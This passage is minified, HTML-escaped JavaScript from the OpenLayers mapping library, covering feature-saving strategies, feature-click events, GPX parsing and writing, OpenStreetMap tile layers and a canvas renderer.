this.layer.events.on(&#123;featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave,scope:this&#125;);return a&#125;,deactivate:function()&#123;var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.auto&amp;&amp;("number"===typeof this.auto?window.clearInterval(this.timer):this.layer.events.un(&#123;featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave,scope:this&#125;));return a&#125;,triggerSave:function(a)&#123;var b=a.feature;b.state!==OpenLayers.State.INSERT&amp;&amp;b.state!==OpenLayers.State.UPDATE&amp;&amp;b.state!==OpenLayers.State.DELETE||this.save([a.feature])&#125;,save:function(a)&#123;a||(a=this.layer.features);this.events.triggerEvent("start",&#123;features:a&#125;);var b=this.layer.projection,c=this.layer.map.getProjectionObject();if(!c.equals(b))&#123;for(var d=a.length,e=Array(d),f,g,h=0;h&lt;d;++h)f=a[h],g=f.clone(),g.fid=f.fid,g.state=f.state,f.url&amp;&amp;(g.url=f.url),g._original=f,g.geometry.transform(c,b),e[h]=g;a=e&#125;this.layer.protocol.commit(a,&#123;callback:this.onCommit,scope:this&#125;)&#125;,onCommit:function(a)&#123;var b=&#123;response:a&#125;;if(a.success())&#123;for(var c=a.reqFeatures,d,e=[],f=a.insertIds||[],g=0,h=0,k=c.length;h&lt;k;++h)if(d=c[h],d=d._original||d,a=d.state)a==OpenLayers.State.DELETE?e.push(d):a==OpenLayers.State.INSERT&amp;&amp;(d.fid=f[g],++g),d.state=null;0&lt;e.length&amp;&amp;this.layer.destroyFeatures(e);this.events.triggerEvent("success",b)&#125;else this.events.triggerEvent("fail",b)&#125;,CLASS_NAME:"OpenLayers.Strategy.Save"&#125;);OpenLayers.Events.featureclick=OpenLayers.Class(&#123;cache:null,map:null,provides:["featureclick","nofeatureclick","featureover","featureout"],initialize:function(a)&#123;this.target=a;if(a.object instanceof OpenLayers.Map)this.setMap(a.object);else if(a.object instanceof OpenLayers.Layer.Vector)a.object.map?this.setMap(a.object.map):a.object.events.register("added",this,function(b)&#123;this.setMap(a.object.map)&#125;);else throw"Listeners for '"+this.provides.join("', '")+"' events can only be registered for OpenLayers.Layer.Vector or OpenLayers.Map instances";for(var b=this.provides.length-1;0&lt;=b;--b)a.extensions[this.provides[b]]=!0&#125;,setMap:function(a)&#123;this.map=a;this.cache=&#123;&#125;;a.events.register("mousedown",this,this.start,&#123;extension:!0&#125;);a.events.register("mouseup",this,this.onClick,&#123;extension:!0&#125;);a.events.register("touchstart",this,this.start,&#123;extension:!0&#125;);a.events.register("touchmove",this,this.cancel,&#123;extension:!0&#125;);a.events.register("touchend",this,this.onClick,&#123;extension:!0&#125;);a.events.register("mousemove",this,this.onMousemove,&#123;extension:!0&#125;)&#125;,start:function(a)&#123;this.startEvt=a&#125;,cancel:function(a)&#123;delete this.startEvt&#125;,onClick:function(a)&#123;if(this.startEvt&amp;&amp;("touchend"===a.type||OpenLayers.Event.isLeftClick(a)))&#123;a=this.getFeatures(this.startEvt);delete this.startEvt;for(var b,c,d=&#123;&#125;,e=0,f=a.length;e&lt;f&amp;&amp;(b=a[e],c=b.layer,d[c.id]=!0,b=this.triggerEvent("featureclick",&#123;feature:b&#125;),!1!==b);++e);e=0;for(f=this.map.layers.length;e&lt;f;++e)c=this.map.layers[e],c instanceof OpenLayers.Layer.Vector&amp;&amp;!d[c.id]&amp;&amp;this.triggerEvent("nofeatureclick",&#123;layer:c&#125;)&#125;&#125;,onMousemove:function(a)&#123;delete this.startEvt;var b=this.getFeatures(a),c=&#123;&#125;;a=[];for(var d,e=0,f=b.length;e&lt;f;++e)d=b[e],c[d.id]=d,this.cache[d.id]||a.push(d);var b=[],g;for(g in this.cache)d=this.cache[g],d.layer&amp;&amp;d.layer.map?c[d.id]||b.push(d):delete this.cache[g];e=0;for(f=a.length;e&lt;f&amp;&amp;(d=a[e],this.cache[d.id]=d,g=this.triggerEvent("featureover",&#123;feature:d&#125;),!1!==g);++e);e=0;for(f=b.length;e&lt;f&amp;&amp;(d=b[e],delete this.cache[d.id],g=this.triggerEvent("featureout",&#123;feature:d&#125;),!1!==g);++e);&#125;,triggerEvent:function(a,b)&#123;var c=b.feature?b.feature.layer:b.layer,d=this.target.object;if(d instanceof OpenLayers.Map||d===c)return this.target.triggerEvent(a,b)&#125;,getFeatures:function(a)&#123;var b=a.clientX,c=a.clientY,d=[],e=[],f=[],g,h,k,l;for(l=this.map.layers.length-1;0&lt;=l;--l)if(g=this.map.layers[l],"none"!==g.div.style.display)if(g.renderer instanceof OpenLayers.Renderer.Elements)&#123;if(g instanceof OpenLayers.Layer.Vector)for(h=document.elementFromPoint(b,c);h&amp;&amp;h._featureId;)(k=g.getFeatureById(h._featureId))?(d.push(k),h.style.display="none",e.push(h),h=document.elementFromPoint(b,c)):h=!1;f.push(g);g.div.style.display="none"&#125;else g.renderer instanceof OpenLayers.Renderer.Canvas&amp;&amp;(k=g.renderer.getFeatureIdFromEvent(a))&amp;&amp;(d.push(k),f.push(g));l=0;for(a=e.length;l&lt;a;++l)e[l].style.display="";for(l=f.length-1;0&lt;=l;--l)f[l].div.style.display="block";return d&#125;,destroy:function()&#123;for(var a=this.provides.length-1;0&lt;=a;--a)delete this.target.extensions[this.provides[a]];this.map.events.un(&#123;mousemove:this.onMousemove,mousedown:this.start,mouseup:this.onClick,touchstart:this.start,touchmove:this.cancel,touchend:this.onClick,scope:this&#125;);delete this.cache;delete this.map;delete this.target&#125;&#125;);OpenLayers.Events.nofeatureclick=OpenLayers.Events.featureclick;OpenLayers.Events.featureover=OpenLayers.Events.featureclick;OpenLayers.Events.featureout=OpenLayers.Events.featureclick;OpenLayers.Format.GPX=OpenLayers.Class(OpenLayers.Format.XML,&#123;defaultDesc:"No description available",extractWaypoints:!0,extractTracks:!0,extractRoutes:!0,extractAttributes:!0,namespaces:&#123;gpx:"http://www.topografix.com/GPX/1/1",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,schemaLocation:"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd",creator:"OpenLayers",initialize:function(a)&#123;this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=[];if(this.extractTracks)for(var c=a.getElementsByTagName("trk"),d=0,e=c.length;d&lt;e;d++)&#123;var f=&#123;&#125;;this.extractAttributes&amp;&amp;(f=this.parseAttributes(c[d]));for(var g=this.getElementsByTagNameNS(c[d],c[d].namespaceURI,"trkseg"),h=0,k=g.length;h&lt;k;h++)&#123;var l=this.extractSegment(g[h],"trkpt");b.push(new OpenLayers.Feature.Vector(l,f))&#125;&#125;if(this.extractRoutes)for(e=a.getElementsByTagName("rte"),c=0,d=e.length;c&lt;d;c++)f=&#123;&#125;,this.extractAttributes&amp;&amp;(f=this.parseAttributes(e[c])),g=this.extractSegment(e[c],"rtept"),b.push(new OpenLayers.Feature.Vector(g,f));if(this.extractWaypoints)for(a=a.getElementsByTagName("wpt"),c=0,e=a.length;c&lt;e;c++)f=&#123;&#125;,this.extractAttributes&amp;&amp;(f=this.parseAttributes(a[c])),d=new OpenLayers.Geometry.Point(a[c].getAttribute("lon"),a[c].getAttribute("lat")),b.push(new OpenLayers.Feature.Vector(d,f));if(this.internalProjection&amp;&amp;this.externalProjection)for(f=0,a=b.length;f&lt;a;f++)b[f].geometry.transform(this.externalProjection,this.internalProjection);return b&#125;,extractSegment:function(a,b)&#123;for(var c=this.getElementsByTagNameNS(a,a.namespaceURI,b),d=[],e=0,f=c.length;e&lt;f;e++)d.push(new OpenLayers.Geometry.Point(c[e].getAttribute("lon"),c[e].getAttribute("lat")));return new OpenLayers.Geometry.LineString(d)&#125;,parseAttributes:function(a)&#123;var b=&#123;&#125;;a=a.firstChild;for(var c,d;a;)1==a.nodeType&amp;&amp;a.firstChild&amp;&amp;(c=a.firstChild,3==c.nodeType||4==c.nodeType)&amp;&amp;(d=a.prefix?a.nodeName.split(":")[1]:a.nodeName,"trkseg"!=d&amp;&amp;"rtept"!=d&amp;&amp;(b[d]=c.nodeValue)),a=a.nextSibling;return b&#125;,write:function(a,b)&#123;a=OpenLayers.Util.isArray(a)?a:[a];var c=this.createElementNS(this.namespaces.gpx,"gpx");c.setAttribute("version","1.1");c.setAttribute("creator",this.creator);this.setAttributes(c,&#123;"xsi:schemaLocation":this.schemaLocation&#125;);b&amp;&amp;"object"==typeof b&amp;&amp;c.appendChild(this.buildMetadataNode(b));for(var d=0,e=a.length;d&lt;e;d++)c.appendChild(this.buildFeatureNode(a[d]));return OpenLayers.Format.XML.prototype.write.apply(this,[c])&#125;,buildMetadataNode:function(a)&#123;for(var b=["name","desc","author"],c=this.createElementNS(this.namespaces.gpx,"metadata"),d=0;d&lt;b.length;d++)&#123;var e=b[d];if(a[e])&#123;var f=this.createElementNS(this.namespaces.gpx,e);f.appendChild(this.createTextNode(a[e]));c.appendChild(f)&#125;&#125;return c&#125;,buildFeatureNode:function(a)&#123;var b=a.geometry,b=b.clone();this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;b.transform(this.internalProjection,this.externalProjection);if("OpenLayers.Geometry.Point"==b.CLASS_NAME)&#123;var c=this.buildWptNode(b);this.appendAttributesNode(c,a);return c&#125;c=this.createElementNS(this.namespaces.gpx,"trk");this.appendAttributesNode(c,a);a=this.buildTrkSegNode(b);a=OpenLayers.Util.isArray(a)?a:[a];for(var b=0,d=a.length;b&lt;d;b++)c.appendChild(a[b]);return c&#125;,buildTrkSegNode:function(a)&#123;var b,c,d,e;if("OpenLayers.Geometry.LineString"==a.CLASS_NAME||"OpenLayers.Geometry.LinearRing"==a.CLASS_NAME)&#123;b=this.createElementNS(this.namespaces.gpx,"trkseg");c=0;for(d=a.components.length;c&lt;d;c++)e=a.components[c],b.appendChild(this.buildTrkPtNode(e));return b&#125;b=[];c=0;for(d=a.components.length;c&lt;d;c++)b.push(this.buildTrkSegNode(a.components[c]));return b&#125;,buildTrkPtNode:function(a)&#123;var b=this.createElementNS(this.namespaces.gpx,"trkpt");b.setAttribute("lon",a.x);b.setAttribute("lat",a.y);return b&#125;,buildWptNode:function(a)&#123;var b=this.createElementNS(this.namespaces.gpx,"wpt");b.setAttribute("lon",a.x);b.setAttribute("lat",a.y);return b&#125;,appendAttributesNode:function(a,b)&#123;var c=this.createElementNS(this.namespaces.gpx,"name");c.appendChild(this.createTextNode(b.attributes.name||b.id));a.appendChild(c);c=this.createElementNS(this.namespaces.gpx,"desc");c.appendChild(this.createTextNode(b.attributes.description||this.defaultDesc));a.appendChild(c)&#125;,CLASS_NAME:"OpenLayers.Format.GPX"&#125;);OpenLayers.Format.WMSDescribeLayer=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.1.1",CLASS_NAME:"OpenLayers.Format.WMSDescribeLayer"&#125;);OpenLayers.Format.WMSDescribeLayer.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSDescribeLayer,&#123;initialize:function(a)&#123;OpenLayers.Format.WMSDescribeLayer.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var b=a.documentElement.childNodes,c=&#123;layerDescriptions:[]&#125;,d,e,f=0;f&lt;b.length;++f)if(d=b[f],e=d.nodeName,"LayerDescription"==e)&#123;e=d.getAttribute("name");var g="",h="",k="";d.getAttribute("owsType")?(g=d.getAttribute("owsType"),h=d.getAttribute("owsURL")):""!=d.getAttribute("wfs")?(g="WFS",h=d.getAttribute("wfs")):""!=d.getAttribute("wcs")&amp;&amp;(g="WCS",h=d.getAttribute("wcs"));d=d.getElementsByTagName("Query");0&lt;d.length&amp;&amp;((k=d[0].getAttribute("typeName"))||(k=d[0].getAttribute("typename")));d=&#123;layerName:e,owsType:g,owsURL:h,typeName:k&#125;;c.layerDescriptions.push(d);c.length=c.layerDescriptions.length;c[c.length-1]=d&#125;else if("ServiceException"==e)return&#123;error:(new OpenLayers.Format.OGCExceptionReport).read(a)&#125;;return c&#125;,CLASS_NAME:"OpenLayers.Format.WMSDescribeLayer.v1_1_1"&#125;);OpenLayers.Format.WMSDescribeLayer.v1_1_0=OpenLayers.Format.WMSDescribeLayer.v1_1_1;OpenLayers.Layer.XYZ=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;isBaseLayer:!0,sphericalMercator:!1,zoomOffset:0,serverResolutions:null,initialize:function(a,b,c)&#123;if(c&amp;&amp;c.sphericalMercator||this.sphericalMercator)c=OpenLayers.Util.extend(&#123;projection:"EPSG:900913",numZoomLevels:19&#125;,c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a||this.name,b||this.url,&#123;&#125;,c])&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.XYZ(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;a=this.getXYZ(a);var b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(""+a.x+a.y+a.z,b));return OpenLayers.String.format(b,a)&#125;,getXYZ:function(a)&#123;var b=this.getServerResolution(),c=Math.round((a.left-this.maxExtent.left)/(b*this.tileSize.w));a=Math.round((this.maxExtent.top-a.top)/(b*this.tileSize.h));b=this.getServerZoom();if(this.wrapDateLine)var d=Math.pow(2,b),c=(c%d+d)%d;return&#123;x:c,y:a,z:b&#125;&#125;,setMap:function(a)&#123;OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.bottom))&#125;,CLASS_NAME:"OpenLayers.Layer.XYZ"&#125;);OpenLayers.Layer.OSM=OpenLayers.Class(OpenLayers.Layer.XYZ,&#123;name:"OpenStreetMap",url:["http://a.tile.openstreetmap.org/$&#123;z&#125;/$&#123;x&#125;/$&#123;y&#125;.png","http://b.tile.openstreetmap.org/$&#123;z&#125;/$&#123;x&#125;/$&#123;y&#125;.png","http://c.tile.openstreetmap.org/$&#123;z&#125;/$&#123;x&#125;/$&#123;y&#125;.png"],attribution:"&amp;copy; &lt;a href='http://www.openstreetmap.org/copyright'&gt;OpenStreetMap&lt;/a&gt; contributors",sphericalMercator:!0,wrapDateLine:!0,tileOptions:null,initialize:function(a,b,c)&#123;OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.tileOptions=OpenLayers.Util.extend(&#123;crossOriginKeyword:"anonymous"&#125;,this.options&amp;&amp;this.options.tileOptions)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.OSM(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])&#125;,CLASS_NAME:"OpenLayers.Layer.OSM"&#125;);OpenLayers.Renderer=OpenLayers.Class(&#123;container:null,root:null,extent:null,locked:!1,size:null,resolution:null,map:null,featureDx:0,initialize:function(a,b)&#123;this.container=OpenLayers.Util.getElement(a);OpenLayers.Util.extend(this,b)&#125;,destroy:function()&#123;this.map=this.resolution=this.size=this.extent=this.container=null&#125;,supported:function()&#123;return!1&#125;,setExtent:function(a,b)&#123;this.extent=a.clone();if(this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine)&#123;var c=a.getWidth()/this.map.getExtent().getWidth();a=a.scale(1/c);this.extent=a.wrapDateLine(this.map.getMaxExtent()).scale(c)&#125;b&amp;&amp;(this.resolution=null);return!0&#125;,setSize:function(a)&#123;this.size=a.clone();this.resolution=null&#125;,getResolution:function()&#123;return this.resolution=this.resolution||this.map.getResolution()&#125;,drawFeature:function(a,b)&#123;null==b&amp;&amp;(b=a.style);if(a.geometry)&#123;var c=a.geometry.getBounds();if(c)&#123;var d;this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;(d=this.map.getMaxExtent());c.intersectsBounds(this.extent,&#123;worldBounds:d&#125;)?this.calculateFeatureDx(c,d):b=&#123;display:"none"&#125;;c=this.drawGeometry(a.geometry,b,a.id);if("none"!=b.display&amp;&amp;b.label&amp;&amp;!1!==c)&#123;d=a.geometry.getCentroid();if(b.labelXOffset||b.labelYOffset)&#123;var e=isNaN(b.labelXOffset)?0:b.labelXOffset,f=isNaN(b.labelYOffset)?0:b.labelYOffset,g=this.getResolution();d.move(e*g,f*g)&#125;this.drawText(a.id,b,d)&#125;else this.removeText(a.id);return c&#125;&#125;&#125;,calculateFeatureDx:function(a,b)&#123;this.featureDx=0;if(b)&#123;var c=b.getWidth();this.featureDx=Math.round(((a.left+a.right)/2-(this.extent.left+this.extent.right)/2)/c)*c&#125;&#125;,drawGeometry:function(a,b,c)&#123;&#125;,drawText:function(a,b,c)&#123;&#125;,removeText:function(a)&#123;&#125;,clear:function()&#123;&#125;,getFeatureIdFromEvent:function(a)&#123;&#125;,eraseFeatures:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b&lt;c;++b)&#123;var d=a[b];this.eraseGeometry(d.geometry,d.id);this.removeText(d.id)&#125;&#125;,eraseGeometry:function(a,b)&#123;&#125;,moveRoot:function(a)&#123;&#125;,getRenderLayerId:function()&#123;return this.container.id&#125;,applyDefaultSymbolizer:function(a)&#123;var b=OpenLayers.Util.extend(&#123;&#125;,OpenLayers.Renderer.defaultSymbolizer);!1===a.stroke&amp;&amp;(delete b.strokeWidth,delete b.strokeColor);!1===a.fill&amp;&amp;delete b.fillColor;OpenLayers.Util.extend(b,a);return b&#125;,CLASS_NAME:"OpenLayers.Renderer"&#125;);OpenLayers.Renderer.defaultSymbolizer=&#123;fillColor:"#000000",strokeColor:"#000000",strokeWidth:2,fillOpacity:1,strokeOpacity:1,pointRadius:0,labelAlign:"cm"&#125;;OpenLayers.Renderer.symbol=&#123;star:[350,75,379,161,469,161,397,215,423,301,350,250,277,301,303,215,231,161,321,161,350,75],cross:[4,0,6,0,6,4,10,4,10,6,6,6,6,10,4,10,4,6,0,6,0,4,4,4,4,0],x:[0,0,25,0,50,35,75,0,100,0,65,50,100,100,75,100,50,65,25,100,0,100,35,50,0,0],square:[0,0,0,1,1,1,1,0,0,0],triangle:[0,10,10,10,5,0,0,10]&#125;;OpenLayers.Renderer.Canvas=OpenLayers.Class(OpenLayers.Renderer,&#123;hitDetection:!0,hitOverflow:0,canvas:null,features:null,pendingRedraw:!1,cachedSymbolBounds:&#123;&#125;,initialize:function(a,b)&#123;OpenLayers.Renderer.prototype.initialize.apply(this,arguments);this.root=document.createElement("canvas");this.container.appendChild(this.root);this.canvas=this.root.getContext("2d");this.features=&#123;&#125;;this.hitDetection&amp;&amp;(this.hitCanvas=document.createElement("canvas"),this.hitContext=this.hitCanvas.getContext("2d"))&#125;,setExtent:function()&#123;OpenLayers.Renderer.prototype.setExtent.apply(this,arguments);return!1&#125;,eraseGeometry:function(a,b)&#123;this.eraseFeatures(this.features[b][0])&#125;,supported:function()&#123;return OpenLayers.CANVAS_SUPPORTED&#125;,setSize:function(a)&#123;this.size=a.clone();var b=this.root;b.style.width=a.w+"px";b.style.height=a.h+"px";b.width=a.w;b.height=a.h;this.resolution=null;this.hitDetection&amp;&amp;(b=this.hitCanvas,b.style.width=a.w+"px",b.style.height=a.h+"px",b.width=a.w,b.height=a.h)&#125;,drawFeature:function(a,b)&#123;var c;if(a.geometry)&#123;b=this.applyDefaultSymbolizer(b||a.style);c=a.geometry.getBounds();var d;this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;(d=this.map.getMaxExtent());d=c&amp;&amp;c.intersectsBounds(this.extent,&#123;worldBounds:d&#125;);(c="none"!==b.display&amp;&amp;!!c&amp;&amp;d)?this.features[a.id]=[a,b]:delete this.features[a.id];this.pendingRedraw=!0&#125;this.pendingRedraw&amp;&amp;!this.locked&amp;&amp;(this.redraw(),this.pendingRedraw=!1);return c&#125;,drawGeometry:function(a,b,c)&#123;var d=a.CLASS_NAME;if("OpenLayers.Geometry.Collection"==d||"OpenLayers.Geometry.MultiPoint"==d||"OpenLayers.Geometry.MultiLineString"==d||"OpenLayers.Geometry.MultiPolygon"==d)for(d=0;d&lt;a.components.length;d++)this.drawGeometry(a.components[d],b,c);else switch(a.CLASS_NAME)&#123;case "OpenLayers.Geometry.Point":this.drawPoint(a,b,c);break;case "OpenLayers.Geometry.LineString":this.drawLineString(a,b,c);break;case "OpenLayers.Geometry.LinearRing":this.drawLinearRing(a,b,c);break;case "OpenLayers.Geometry.Polygon":this.drawPolygon(a,b,c)&#125;&#125;,drawExternalGraphic:function(a,b,c)&#123;var d=new Image,e=b.title||b.graphicTitle;e&amp;&amp;(d.title=e);var f=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,f=f?f:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*f),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),l=b.graphicOpacity||b.fillOpacity;d.onload=OpenLayers.Function.bind(function()&#123;if(this.features[c])&#123;var b=this.getLocalXY(a),e=b[0],b=b[1];if(!isNaN(e)&amp;&amp;!isNaN(b))&#123;var e=e+h|0,b=b+k|0,p=this.canvas;p.globalAlpha=l;var q=OpenLayers.Renderer.Canvas.drawImageScaleFactor||(OpenLayers.Renderer.Canvas.drawImageScaleFactor=/android 2.1/.test(navigator.userAgent.toLowerCase())?320/window.screen.width:1);p.drawImage(d,e*q,b*q,f*q,g*q);this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c),this.hitContext.fillRect(e,b,f,g))&#125;&#125;&#125;,this);d.src=b.externalGraphic&#125;,drawNamedSymbol:function(a,b,c)&#123;var d,e,f,g;f=Math.PI/180;var h=OpenLayers.Renderer.symbol[b.graphicName];if(!h)throw Error(b.graphicName+" is not a valid symbol name");if(!(!h.length||2&gt;h.length||(a=this.getLocalXY(a),e=a[0],g=a[1],isNaN(e)||isNaN(g))))&#123;this.canvas.lineCap="round";this.canvas.lineJoin="round";this.hitDetection&amp;&amp;(this.hitContext.lineCap="round",this.hitContext.lineJoin="round");if(b.graphicName in this.cachedSymbolBounds)d=this.cachedSymbolBounds[b.graphicName];else&#123;d=new OpenLayers.Bounds;for(a=0;a&lt;h.length;a+=2)d.extend(new OpenLayers.LonLat(h[a],h[a+1]));this.cachedSymbolBounds[b.graphicName]=d&#125;this.canvas.save();this.hitDetection&amp;&amp;this.hitContext.save();this.canvas.translate(e,g);this.hitDetection&amp;&amp;this.hitContext.translate(e,g);a=f*b.rotation;isNaN(a)||(this.canvas.rotate(a),this.hitDetection&amp;&amp;this.hitContext.rotate(a));f=2*b.pointRadius/Math.max(d.getWidth(),d.getHeight());this.canvas.scale(f,f);this.hitDetection&amp;&amp;this.hitContext.scale(f,f);a=d.getCenterLonLat().lon;d=d.getCenterLonLat().lat;this.canvas.translate(-a,-d);this.hitDetection&amp;&amp;this.hitContext.translate(-a,-d);g=b.strokeWidth;b.strokeWidth=g/f;if(!1!==b.fill)&#123;this.setCanvasStyle("fill",b);this.canvas.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.fill();if(this.hitDetection)&#123;this.setHitContextStyle("fill",c,b);this.hitContext.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.fill()&#125;&#125;if(!1!==b.stroke)&#123;this.setCanvasStyle("stroke",b);this.canvas.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.canvas.moveTo(d,e),this.canvas.lineTo(d,e);this.canvas.closePath();this.canvas.stroke();if(this.hitDetection)&#123;this.setHitContextStyle("stroke",c,b,f);this.hitContext.beginPath();for(a=0;a&lt;h.length;a+=2)d=h[a],e=h[a+1],0==a&amp;&amp;this.hitContext.moveTo(d,e),this.hitContext.lineTo(d,e);this.hitContext.closePath();this.hitContext.stroke()&#125;&#125;b.strokeWidth=g;this.canvas.restore();this.hitDetection&amp;&amp;this.hitContext.restore();this.setCanvasStyle("reset")&#125;&#125;,setCanvasStyle:function(a,b)&#123;"fill"===a?(this.canvas.globalAlpha=b.fillOpacity,this.canvas.fillStyle=b.fillColor):"stroke"===a?(this.canvas.globalAlpha=b.strokeOpacity,this.canvas.strokeStyle=b.strokeColor,this.canvas.lineWidth=b.strokeWidth):(this.canvas.globalAlpha=0,this.canvas.lineWidth=1)&#125;,featureIdToHex:function(a)&#123;a=Number(a.split("_").pop())+1;16777216&lt;=a&amp;&amp;(this.hitOverflow=a-16777215,a=a%16777216+1);a="000000"+a.toString(16);var b=a.length;return a="#"+a.substring(b-6,b)&#125;,setHitContextStyle:function(a,b,c,d)&#123;b=this.featureIdToHex(b);"fill"==a?(this.hitContext.globalAlpha=1,this.hitContext.fillStyle=b):"stroke"==a?(this.hitContext.globalAlpha=1,this.hitContext.strokeStyle=b,"undefined"===typeof d?this.hitContext.lineWidth=c.strokeWidth+2:isNaN(d)||(this.hitContext.lineWidth=c.strokeWidth+2/d)):(this.hitContext.globalAlpha=0,this.hitContext.lineWidth=1)&#125;,drawPoint:function(a,b,c)&#123;if(!1!==b.graphic)if(b.externalGraphic)this.drawExternalGraphic(a,b,c);else if(b.graphicName&amp;&amp;"circle"!=b.graphicName)this.drawNamedSymbol(a,b,c);else&#123;var d=this.getLocalXY(a);a=d[0];d=d[1];if(!isNaN(a)&amp;&amp;!isNaN(d))&#123;var e=2*Math.PI,f=b.pointRadius;!1!==b.fill&amp;&amp;(this.setCanvasStyle("fill",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.fill(),this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.fill()));!1!==b.stroke&amp;&amp;(this.setCanvasStyle("stroke",b),this.canvas.beginPath(),this.canvas.arc(a,d,f,0,e,!0),this.canvas.stroke(),this.hitDetection&amp;&amp;(this.setHitContextStyle("stroke",c,b),this.hitContext.beginPath(),this.hitContext.arc(a,d,f,0,e,!0),this.hitContext.stroke()),this.setCanvasStyle("reset"))&#125;&#125;&#125;,drawLineString:function(a,b,c)&#123;b=OpenLayers.Util.applyDefaults(&#123;fill:!1&#125;,b);this.drawLinearRing(a,b,c)&#125;,drawLinearRing:function(a,b,c)&#123;!1!==b.fill&amp;&amp;(this.setCanvasStyle("fill",b),this.renderPath(this.canvas,a,b,c,"fill"),this.hitDetection&amp;&amp;(this.setHitContextStyle("fill",c,b),this.renderPath(this.hitContext,a,b,c,"fill")));!1!==b.stroke&amp;&amp;(this.setCanvasStyle("stroke",b),this.renderPath(this.canvas,a,b,c,"stroke"),this.hitDetection&amp;&amp;(this.setHitContextStyle("stroke",c,b),this.renderPath(this.hitContext,a,b,c,"stroke")));this.setCanvasStyle("reset")&#125;,renderPath:function(a,b,c,d,e)&#123;b=b.components;c=b.length;a.beginPath();d=this.getLocalXY(b[0]);var f=d[1];if(!isNaN(d[0])&amp;&amp;!isNaN(f))&#123;a.moveTo(d[0],d[1]);for(d=1;d&lt;c;++d)f=this.getLocalXY(b[d]),a.lineTo(f[0],f[1]);"fill"===e?a.fill():a.stroke()&#125;&#125;,drawPolygon:function(a,b,c)&#123;a=a.components;var d=a.length;this.drawLinearRing(a[0],b,c);for(var e=1;e&lt;d;++e)this.canvas.globalCompositeOperation="destination-out",this.hitDetection&amp;&amp;(this.hitContext.globalCompositeOperation="destination-out"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults(&#123;stroke:!1,fillOpacity:1&#125;,b),c),this.canvas.globalCompositeOperation="source-over",this.hitDetection&amp;&amp;(this.hitContext.globalCompositeOperation="source-over"),this.drawLinearRing(a[e],OpenLayers.Util.applyDefaults(&#123;fill:!1&#125;,b),c)&#125;,drawText:function(a,b)&#123;var c=this.getLocalXY(a);this.setCanvasStyle("reset");this.canvas.fillStyle=b.fontColor;this.canvas.globalAlpha=b.fontOpacity||1;var d=[b.fontStyle?b.fontStyle:"normal","normal",b.fontWeight?b.fontWeight:"normal",b.fontSize?b.fontSize:"1em",b.fontFamily?b.fontFamily:"sans-serif"].join(" "),e=b.label.split("\n"),f=e.length;if(this.canvas.fillText)&#123;this.canvas.font=d;this.canvas.textAlign=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[0]]||"center";this.canvas.textBaseline=OpenLayers.Renderer.Canvas.LABEL_ALIGN[b.labelAlign[1]]||"middle";var g=OpenLayers.Renderer.Canvas.LABEL_FACTOR[b.labelAlign[1]];null==g&amp;&amp;(g=-0.5);d=this.canvas.measureText("Mg").height||this.canvas.measureText("xx").width;c[1]+=d*g*(f-1);for(g=0;g&lt;f;g++)b.labelOutlineWidth&amp;&amp;(this.canvas.save(),this.canvas.globalAlpha=b.labelOutlineOpacity||b.fontOpacity||1,this.canvas.strokeStyle=b.labelOutlineColor,this.canvas.lineWidth=b.labelOutlineWidth,this.canvas.strokeText(e[g],c[0],c[1]+d*g+1),this.canvas.restore()),this.canvas.fillText(e[g],c[0],c[1]+d*g)&#125;else if(this.canvas.mozDrawText)&#123;this.canvas.mozTextStyle=d;var 